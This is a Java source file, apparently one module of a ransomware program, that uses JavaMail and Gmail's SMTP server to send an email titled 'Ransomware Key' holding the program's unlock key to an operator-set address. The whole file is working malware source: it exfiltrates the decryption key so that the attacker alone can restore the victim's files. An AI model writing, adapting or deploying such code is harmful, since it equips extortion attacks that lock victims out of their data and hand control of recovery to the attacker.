import java.util.*;
import javax.mail.*;
import javax.mail.internet.*;

public class Emailer {
    private String sender;
    private String password;
    private String recipient;

    public void setSender(String sender){
        this.sender = sender;
    }

    public void setPassword(String password){
        this.password = password;
    }

    public void setRecipient(String recipient){
        this.recipient = recipient;
    }

    public void sendEmail(){
        try {
            // Setting up GMAIL SMTP service
            Properties properties = new Properties();
            properties.put("mail.smtp.auth", true); // GMAIL SMTP authentication
            properties.put("mail.smtp.host", "smtp.gmail.com"); // GMAIL outgoing SMTP server
            properties.put("mail.smtp.port", 587); // GMAIL Port 587 (TLS)
            properties.put("mail.smtp.starttls.enable", true); // Transport Security Layer
            properties.put("mail.transport.protocol", "smtp");

            // Get account authentication
            Session session = Session.getInstance(properties, new Authenticator() {
                @Override
                protected PasswordAuthentication getPasswordAuthentication() {
                    return new PasswordAuthentication(sender, password);
                }
            });

            // Creating message and sending
            Message message = new MimeMessage(session);
            message.setSubject("Ransomware Key");

            Address recipient = new InternetAddress(this.recipient);
            message.setRecipient(Message.RecipientType.TO, recipient);

            MimeMultipart multipart = new MimeMultipart();

            MimeBodyPart msgBodyPart_1 = new MimeBodyPart();
            MimeBodyPart msgBodyPart_2 = new MimeBodyPart();

            msgBodyPart_1.setContent("-Unlock Key-<br> <br>", "text/html");
            msgBodyPart_2.setContent("<FONT COLOR=\"#862BFE\">" + Ransomware.unlockKey, "text/html");

            multipart.addBodyPart(msgBodyPart_1);
            multipart.addBodyPart(msgBodyPart_2);

            message.setContent(multipart);

            Transport.send(message);
        }
        catch(MessagingException e){
            e.printStackTrace();
        }
    }

}
